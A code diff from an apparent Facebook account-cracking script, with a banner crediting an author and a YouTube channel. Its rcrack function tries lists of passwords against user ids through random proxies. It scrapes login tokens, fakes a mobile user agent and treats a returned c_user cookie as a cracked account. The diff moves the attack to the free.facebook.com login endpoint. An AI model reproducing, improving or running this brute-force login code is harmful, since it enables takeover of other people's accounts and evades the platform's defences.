@@ -50,7 +50,7 @@ _        _______  _______ _________ _______  _
 ══════════════════════════════════════════════════
   Author       :Abu Bakar
   Brother      :Kareem Don
-  TOOLS STATUS : free
+  TOOLS STATUS :Free
   Youtube      :JHALLA TRICK ZONE
 ══════════════════════════════════════════════════"""
 loop = 0
@@ -159,18 +159,18 @@ def rcrack(uid,pwx,tl):
         for ps in pwx:
             pro = random.choice(proxy)
             session = requests.Session()
-            m_fb = session.get('https://m.facebook.com').text
+            free_fb = session.get('https://free.facebook.com').text
             log_data = {
-                "lsd":re.search('name="lsd" value="(.*?)"', str(m_fb)).group(1),
-            "jazoest":re.search('name="jazoest" value="(.*?)"', str(m_fb)).group(1),
-            "m_ts":re.search('name="m_ts" value="(.*?)"', str(m_fb)).group(1),
-            "li":re.search('name="li" value="(.*?)"', str(m_fb)).group(1),
+                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
+            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
             "try_number":"0",
             "unrecognized_tries":"0",
             "email":uid,
             "pass":ps,
             "login":"Log In"}
-            header_mfb = {'authority':'m.facebook.com',
+            header_freefb = {'authority':'free.facebook.com',
             'method': 'GET',
             'scheme': 'https',
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
@@ -183,8 +183,8 @@ def rcrack(uid,pwx,tl):
             'sec-fetch-site': 'none',
             'sec-fetch-user': '?1',
             'upgrade-insecure-requests': '1',
-             'user-agent':'Mozilla/5.0 (Linux; Android 8.1.0; TECNO RB7S Build/OPM2.171019.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36',}
-            lo = session.get('https://m.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_mfb).text
+             'user-agent':'Nokia 6230 Mobile Phone: Nokia6230/2.0+(04.43)+Profile/MIDP-2.0+Configuration/CLDC-1.1+UP.Link/6.3.0.0.0',}
+            lo = session.get('https://free.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             #print(iid+'|'+pws+'|'+str(log_cookies))
             if 'c_user' in log_cookies:
